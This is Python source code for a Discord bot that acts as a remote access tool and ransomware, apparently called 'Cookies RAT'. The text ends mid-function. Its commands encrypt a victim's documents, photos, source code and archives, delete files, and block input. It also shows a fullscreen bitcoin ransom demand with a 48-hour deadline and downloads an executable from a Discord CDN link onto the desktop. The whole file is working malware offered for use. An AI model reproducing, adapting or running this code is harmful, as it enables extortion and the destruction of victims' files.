import discord
import json
import asyncio 
import ctypes 
import os 
import random
import string
import win32gui
import re
import base64
import webbrowser
import discord
import urllib.request
import urllib
import tkinter as tk
from threading import *
from time import *
import socket, threading, time

from urllib.request import urlopen
from time import sleep

from discord_components import *
from discord.ext import commands
from discord_slash import SlashContext, SlashCommand
from discord_slash.model import ButtonStyle
from discord_slash.utils.manage_components import create_button, create_actionrow

from tokens import *

from cryptography.fernet import Fernet as f
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from discord_components import *
from discord.ext import commands
from tkinter import *
from random import randint
from ctypes import *

digits = randint(1111,9999)
global appdata
appdata = os.getenv('APPDATA')

# Bot command prefix
client = commands.Bot(command_prefix='!', intents=discord.Intents.all(), description='Remote Access Tool to shits on pc\'s')
slash = SlashCommand(client, sync_commands=True)

def password(passwd):
    
    password = passwd.encode() 
    salt = b'salt_' 
    kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=100000,
    backend=default_backend()
            )
    k = base64.urlsafe_b64encode(kdf.derive(password))
    return k

def enc_fun(key,file):
    try:
        with open(file,"rb") as fname:
            data = fname.read()
        fl,ext = os.path.splitext(file)
        fkey = f(key)
        enc = fkey.encrypt(data)
        with open(str(fl[0:])+ext+'.PAYUPBITCH','wb') as encfile:
            encfile.write(enc)
        os.remove(file)
    except:
        pass

def dec_fun(key,file):
    try:        
        with open(file, "rb") as fname:
            data = fname.read()
        fkey = f(key)
        fl,ext = os.path.splitext(file)
        dec = fkey.decrypt(data)
        with open(str(fl[0:]), 'wb') as decfile:
            decfile.write(dec)
        os.remove(file)
    
    except:
        pass

def spam_messagebox():

    root= tk.Tk()
    width = root.winfo_screenwidth() 
    height = root.winfo_screenheight() 


    canvas1 = tk.Canvas(root, width = width, height = height, bg='black') 
    canvas1.pack()

    label1 = tk.Label(root, text='YOUR FILES HAVE BEEN ENCRYPTED') 
    label1.config(font=('helvetica', int(height/20)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/15), window=label1)


    label1 = tk.Label(root, text=f'YOUR DIGITS ARE {digits}') 
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*4, window=label1)


    label1 = tk.Label(root, text='YOUR IMPORTANT PROGRAMS, DOCUMENTS, DATAS, PHOTOS, SCRIPTS, SOURCE CODE AND VIDEOS') 
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*6, window=label1)


    label1 = tk.Label(root, text='HAVE BEEN ENCRYPTED WITH HIGH GRADE MILITARY ENCRYPTION.') 
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*7, window=label1)


    label1 = tk.Label(root, text='YOU ONLY HAVE 48 HOURS TO SUBMIT THE PAYMENT, AFTER THAT THE PRICE WILL BE DOUBLED') 
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*8, window=label1)


    label1 = tk.Label(root, text='If you do not pay within 5 days, your files will be deleted forever') 
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*9, window=label1)


    label1 = tk.Label(root, text=f'to decrypt them, send {ransom_price} in BITCOIN to')
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*11, window=label1)

    
    labelBTC = tk.Label(root, text=f"{btc_address}") 
    labelBTC.config(font=('helvetica', int(height/50))) 
    labelBTC.config(background='black', foreground='red') 
    canvas1.create_window(int(width/2), int(height/20)*13, window=labelBTC)
                                                # *13 means how far down the canvas the subtitle is!

    label1 = tk.Label(root, text=f'and then send proof of transfer & your digits to {hackers_email} to get your files decrypted')
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*15, window=label1)

    def How_To_BTC():
        webbrowser.open('https://blog.hubspot.com/marketing/how-to-get-bitcoins#:~:text=There%20are%20four%20main%20ways,in%20exchange%20for%20completing%20tasks.')


    button1 = tk.Button(text='How to buy BITCOIN?', command=How_To_BTC)
    button1.config(background='blue')
    canvas1.create_window(int(width/2), int(height/20)*17, window=button1)



    root.attributes('-topmost', True) # Puts message box infont of everything else
    root.attributes('-fullscreen', True) # Set message box to fullscreen
    root.mainloop()

def download_decrypter():

    NAME = os.getlogin()
    req = urllib.request.Request('https://cdn.discordapp.com/attachments/947224575622676520/966006697120378880/Decrypt_My_Files.exe', headers={'User-Agent': 'Mozilla/5.0'})
    f = urlopen(req)
    filecontent = f.read()
    with open(f'C:\\Users\\{NAME}\\Desktop\\Decrypt_My_Files.exe', 'wb') as f:
        f.write(filecontent)
    f.close()


@client.event
async def on_slash_command_error(ctx, error):
    if isinstance(error, discord.ext.commands.errors.MissingPermissions):
        await ctx.send('Shit. . . You dont have permission to executed this command')
    else:
        print(error)

@client.event
async def on_command_error(cmd, error):
    if isinstance(error, discord.ext.commands.errors.CommandNotFound):
        pass

async def activity(client):
    while True:
        if stop_threads:
            break
        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        await client.change_presence(status=discord.Status.online, activity=discord.Game(f"Visiting: {window}"))
        sleep(1)

@client.event
async def on_ready():
    global channel_name
    DiscordComponents(client)
    number = 0
    with urlopen("http://ipinfo.io/json") as url:
        data = json.loads(url.read().decode())
        ip = data['ip']
        
    for x in client.get_all_channels():
        (on_ready.total).append(x.name)
    for y in range(len(on_ready.total)):
        if "session" in on_ready.total[y]:
            result = [e for e in re.split("[^0-9]", on_ready.total[y]) if e != '']
            biggest = max(map(int, result))
            number = biggest + 1
        else:
            pass  

    if number == 0:
        channel_name = "session-1"
        await client.guilds[0].create_text_channel(channel_name)
    else:
        channel_name = f"session-{number}"
        await client.guilds[0].create_text_channel(channel_name)
        
    channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
    channel = client.get_channel(channel_.id)
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    value1 = f"**{channel_name}** | IP: **||{ip}||**\n> Some dumbass named **`{os.getlogin()}`** ran Cookies RAT start fucking there shit up!"
    if is_admin == True:
        await channel.send(f'{value1} with **`admin`** perms sheeeeeeeeesh')
    elif is_admin == False:
        await channel.send(value1)
    game = discord.Game(f"Dev | CookiesKush420#4152")
    await client.change_presence(status=discord.Status.online, activity=game)

on_ready.total = []

def between_callback(client):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(activity(client))
    loop.close()


@slash.slash(name="kill", description="kills all inactive sessions", guild_ids=g)
async def kill_command(ctx: SlashContext):
    for y in range(len(on_ready.total)): 
        if "session" in on_ready.total[y]:
            channel_to_delete = discord.utils.get(client.get_all_channels(), name=on_ready.total[y])
            await channel_to_delete.delete()
        else:
            pass
    await ctx.send(f"Killed all the inactive sessions")


@slash.slash(name="exit", description="stop the program on victims pc", guild_ids=g)
async def exit_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        buttons = [
                create_button(
                    style=ButtonStyle.green,
                    label="YES"
                ),
                create_button(
                    style=ButtonStyle.red,
                    label="NO"
                ),
              ]
        action_row = create_actionrow(*buttons)
        await ctx.send("Are you sure you want to exit the program on your victims pc?", components=[action_row])

        res = await client.wait_for('button_click')
        if res.component.label == "YES":
            await ctx.send(content="Exited the program!", hidden=True)
            os._exit(0)
        else:
            await ctx.send(content="Cancelled the exit", hidden=True)


@slash.slash(name="EncryptFiles", description="Encrypt users file with full dirpath", guild_ids=g)
async def EncryptFiles_command(ctx: SlashContext, userdir: str):
    if ctx.channel.name == channel_name:
        await ctx.send(f"Succesfully encrypting users files, Please wait for the DIR ```{userdir}``` to encrypt and the bot will send the key here needed to decrypt the DIR! **DONT LOOSE IT**")

        listOfFiles = list()

        file_input = userdir
        if os.path.exists(file_input):
            if file_input !="":
                import time
                characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
                length = 30
                
                passwd = ''
                for c in range(length):
                    passwd += random.choice(characters)

                start = time.time()
                if os.path.isfile(file_input)==False:
                    for (dirpath, dirnames, filenames) in os.walk(file_input):
                        EXCLUDE_DIRECTORY = (
                            
                            '/usr',  
                            '/Library/',
                            '/System',
                            '/Applications',
                            '.Trash',
                            
                            'Program Files',
                            'Program Files (x86)',
                            'Windows',
                            '$Recycle.Bin',
                            'AppData',
                            'logs',
                        )
                        if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                            pass
                        else:
                            listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                            for l in listOfFiles:
                                EXTENSIONS = (
                                    # '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                    '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                    '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                    '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                            
                                    '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                    '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                    '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                    '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                    
                                    '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                    '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                    '.java', '.class', '.jar', # java source code
                                    '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                    '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                    '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                            
                                    '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                                )
                                if l.endswith(EXTENSIONS):
                                    import threading
                                    x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                    x.start()
                                    x.join()
                else:
                    enc_fun(password(passwd),file_input)

                await ctx.send(f"Key to decrypt DIR: ```{passwd}```")
            else:
                await ctx.send(f"Please enter a DIR!")
        else:
            await ctx.send(f"DIR does not exist!")


@slash.slash(name="DeleteFiles", description="Delete users file with full dirpath", guild_ids=g)
async def DeleteFiles_command(ctx: SlashContext, usersdir: str):
    if ctx.channel.name == channel_name:
        await ctx.send(f"Starting to delete folder / DIR")
        
        listOfFiles = list()
        file_input = usersdir
        if os.path.exists(file_input):
            if file_input !="":
                if os.path.isfile(file_input)==False:
                        for (dirpath, dirnames, filenames) in os.walk(file_input):
                            EXCLUDE_DIRECTORY = (
                                
                                '/usr',  
                                '/Library/',
                                '/System',
                                '/Applications',
                                '.Trash',
                                
                                'Program Files',
                                'Program Files (x86)',
                                'Windows',
                                '$Recycle.Bin',
                                'AppData',
                                'logs',
                            )
                            if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                                pass
                            else:
                                listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                                for l in listOfFiles:
                                    EXTENSIONSS = (
                                        '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                        '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                        '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                        '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                                
                                        '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                        '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                        '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                        '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                        
                                        '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                        '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                        '.java', '.class', '.jar', # java source code
                                        '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                        '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                        '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                                
                                        '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak', '.PAYUPBITCH',  # compressed formats
                                    )
                                    if l.endswith(EXTENSIONSS):
                                        # Delete folder . .    
                                        try:
                                            os.remove(l)
                                        except OSError as e:
                                            await ctx.send("Error: %s : %s" % (l, e.strerror))  
                                    else:
                                        pass
                else:
                    # Delete file . .  
                    try:
                        os.remove(file_input)
                        await ctx.send("Successfully deleted File!")
                    except OSError as e:
                        await ctx.send("Error: %s : %s" % (file_input, e.strerror))

                await ctx.send(f"Deleted user DIR / folder ```{file_input}``` Contents Deleted ```{filenames}```")
            else:                             
                await ctx.send(f"**Please enter a DIR!**")
        else:           
            await ctx.send(f"DIR does not exist! ```{file_input}```")


@slash.slash(name="SendMessageBox", description="Send final message box only once ready", guild_ids=g)
async def SendMessageBox_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        buttons = [
                create_button(
                    style=ButtonStyle.green,
                    label="YES"
                ),
                create_button(
                    style=ButtonStyle.red,
                    label="NO"
                ),
              ]
        action_row = create_actionrow(*buttons)
        await ctx.send("Do u want to also block the users input? (Admin Rights Required)", components=[action_row])

        res = await client.wait_for('button_click')
        if res.component.label == "YES":
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                await ctx.send("Downloading decrypter and sending message box!")
                download_decrypter()
                ok = windll.user32.BlockInput(True)
                spam_messagebox()
                await ctx.send(content="Sent! ```If victim does not pay within 48 hours double the payment price```", hidden=True)
            else:
                await ctx.send("**Admin Rights Required!**")
        else:
            download_decrypter()
            spam_messagebox()
            await ctx.send(content="Sent! ```If victim does not pay within 48 hours double the payment price```", hidden=True)


@slash.slash(name="EncryptAll", description="Encrypt all users files! (much easier, alot slower)", guild_ids=g)
async def EncryptAll_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        PASSWORDS = []

        # Encrypt C: Items, Desktop, Downloads, Documents, Pictures etc...
        def C_drive_desktop():
            userdir = f'C:\\Users\\{os.getlogin()}\\Desktop'
            listOfFiles = list()

            file_input = userdir
            if os.path.exists(file_input):
                if file_input !="":
                    import time
                    characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
                    length = 30
                    
                    passwd = ''
                    for c in range(length):
                        passwd += random.choice(characters)

                    start = time.time()
                    if os.path.isfile(file_input)==False:
                        for (dirpath, dirnames, filenames) in os.walk(file_input):
                            EXCLUDE_DIRECTORY = (
                                
                                '/usr',  
                                '/Library/',
                                '/System',
                                '/Applications',
                                '.Trash',
                                
                                'Program Files',
                                'Program Files (x86)',
                                'Windows',
                                '$Recycle.Bin',
                                'AppData',
                                'logs',
                            )
                            if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                                pass
                            else:
                                listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                                for l in listOfFiles:
                                    EXTENSIONS = (
                                        '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                        '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                        '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                        '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                                
                                        '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                        '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                        '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                        '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                        
                                        '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                        '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                        '.java', '.class', '.jar', # java source code
                                        '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                        '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                        '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                                
                                        '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                                    )
                                    if l.endswith(EXTENSIONS):
                                        import threading
                                        x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                        x.start()
                                        x.join()
                    else:
                        enc_fun(password(passwd),file_input)

                    finshed = True
                    lol = 'Desktop Folder : '
                    PASSWORDS.append(f"{lol}{passwd}")
                else:
                    shit = 420
            else:
                shit = 420

        def C_drive_downloads():
            userdir = f'C:\\Users\\{os.getlogin()}\\Downloads'
            listOfFiles = list()

            file_input = userdir
            if os.path.exists(file_input):
                if file_input !="":
                    import time
                    characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
                    length = 30
                    
                    passwd = ''
                    for c in range(length):
                        passwd += random.choice(characters)

                    start = time.time()
                    if os.path.isfile(file_input)==False:
                        for (dirpath, dirnames, filenames) in os.walk(file_input):
                            EXCLUDE_DIRECTORY = (
                                
                                '/usr',  
                                '/Library/',
                                '/System',
                                '/Applications',
                                '.Trash',
                                
                                'Program Files',
                                'Program Files (x86)',
                                'Windows',
                                '$Recycle.Bin',
                                'AppData',
                                'logs',
                            )
                            if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                                pass
                            else:
                                listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                                for l in listOfFiles:
                                    EXTENSIONS = (
                                        '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                        '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                        '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                        '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                                
                                        '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                        '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                        '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                        '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                        
                                        '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                        '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                        '.java', '.class', '.jar', # java source code
                                        '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                        '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                        '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                                
                                        '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                                    )
                                    if l.endswith(EXTENSIONS):
                                        import threading
                                        x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                        x.start()
                                        x.join()
                    else:
                        enc_fun(password(passwd),file_input)

                    finshed = True
                    lol = 'Downloads Folder : '
                    PASSWORDS.append(f"{lol}{passwd}")
                else:
                    shit = 420
            else:
                shit = 420

        def C_drive_documents():
            userdir = f'C:\\Users\\{os.getlogin()}\\Documents'
            listOfFiles = list()

            file_input = userdir
            if os.path.exists(file_input):
                if file_input !="":
                    import time
                    characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
                    length = 30
                    
                    passwd = ''
                    for c in range(length):
                        passwd += random.choice(characters)

                    start = time.time()
                    if os.path.isfile(file_input)==False:
                        for (dirpath, dirnames, filenames) in os.walk(file_input):
                            EXCLUDE_DIRECTORY = (
                                
                                '/usr',  
                                '/Library/',
                                '/System',
                                '/Applications',
                                '.Trash',
                                
                                'Program Files',
                                'Program Files (x86)',
                                'Windows',
                                '$Recycle.Bin',
                                'AppData',
                                'logs',
                            )
                            if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                                pass
                            else:
                                listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                                for l in listOfFiles:
                                    EXTENSIONS = (
                                        '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                        '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                        '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                        '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                                
                                        '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                        '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                        '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                        '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                        
                                        '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                        '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                        '.java', '.class', '.jar', # java source code
                                        '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                        '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                        '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                                
                                        '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                                    )
                                    if l.endswith(EXTENSIONS):
                                        import threading
                                        x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                        x.start()
                                        x.join()
                    else:
                        enc_fun(password(passwd),file_input)

                    finshed = True
                    lol = 'Documents Folder : '
                    PASSWORDS.append(f"{lol}{passwd}")
                else:
                    shit = 420
            else:
                shit = 420

        def C_drive_music():
            userdir = f'C:\\Users\\{os.getlogin()}\\Music'
            listOfFiles = list()

            file_input = userdir
            if os.path.exists(file_input):
                if file_input !="":
                    import time
                    characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
                    length = 30
                    
                    passwd = ''
                    for c in range(length):
                        passwd += random.choice(characters)

                    start = time.time()
                    if os.path.isfile(file_input)==False:
                        for (dirpath, dirnames, filenames) in os.walk(file_input):
                            EXCLUDE_DIRECTORY = (
                                
                                '/usr',  
                                '/Library/',
                                '/System',
                                '/Applications',
                                '.Trash',
                                
                                'Program Files',
                                'Program Files (x86)',
                                'Windows',
                                '$Recycle.Bin',
                                'AppData',
                                'logs',
                            )
                            if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                                pass
                            else:
                                listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                                for l in listOfFiles:
                                    EXTENSIONS = (
                                        '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                        '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                        '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                        '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                                
                                        '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                        '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                        '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                        '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                        
                                        '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                        '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                        '.java', '.class', '.jar', # java source code
                                        '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                        '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                        '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                                
                                        '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                                    )
                                    if l.endswith(EXTENSIONS):
                                        import threading
                                        x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                        x.start()
                                        x.join()
                    else:
                        enc_fun(password(passwd),file_input)

                    finshed = True
                    lol = 'Music Folder : '
                    PASSWORDS.append(f"{lol}{passwd}")
                else:
                    shit = 420
            else:
                shit = 420

        def C_drive_pictures():
            userdir = f'C:\\Users\\{os.getlogin()}\\Pictures'
            listOfFiles = list()

            file_input = userdir
            if os.path.exists(file_input):
                if file_input !="":
                    import time
                    characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
                    length = 30
                    
                    passwd = ''
                    for c in range(length):
                        passwd += random.choice(characters)

                    start = time.time()
                    if os.path.isfile(file_input)==False:
                        for (dirpath, dirnames, filenames) in os.walk(file_input):
                            EXCLUDE_DIRECTORY = (
                                
                                '/usr',  
                                '/Library/',
                                '/System',
                                '/Applications',
                                '.Trash',
                                
                                'Program Files',
                                'Program Files (x86)',
                                'Windows',
                                '$Recycle.Bin',
                                'AppData',
                                'logs',
                            )
                            if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                                pass
                            else:
                                listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                                for l in listOfFiles:
                                    EXTENSIONS = (
                                        '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                        '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                        '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                        '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                                
                                        '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                        '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                        '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                        '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                        
                                        '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                        '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                        '.java', '.class', '.jar', # java source code
                                        '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                        '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                        '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                                
                                        '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                                    )
                                    if l.endswith(EXTENSIONS):
                                        import threading
                                        x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                        x.start()
                                        x.join()
                    else:
                        enc_fun(password(passwd),file_input)

                    finshed = True
                    lol = 'Pictures Folder : '
                    PASSWORDS.append(f"{lol}{passwd}")
                else:
                    shit = 420
            else:
                shit = 420

        def C_drive_videos():
            userdir = f'C:\\Users\\{os.getlogin()}\\Videos'
            listOfFiles = list()

            file_input = userdir
            if os.path.exists(file_input):
                if file_input !="":
                    import time
                    characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
                    length = 30
                    
                    passwd = ''
                    for c in range(length):
                        passwd += random.choice(characters)

                    start = time.time()
                    if os.path.isfile(file_input)==False:
                        for (dirpath, dirnames, filenames) in os.walk(file_input):
                            EXCLUDE_DIRECTORY = (
                                
                                '/usr',  
                                '/Library/',
                                '/System',
                                '/Applications',
                                '.Trash',
                                
                                'Program Files',
                                'Program Files (x86)',
                                'Windows',
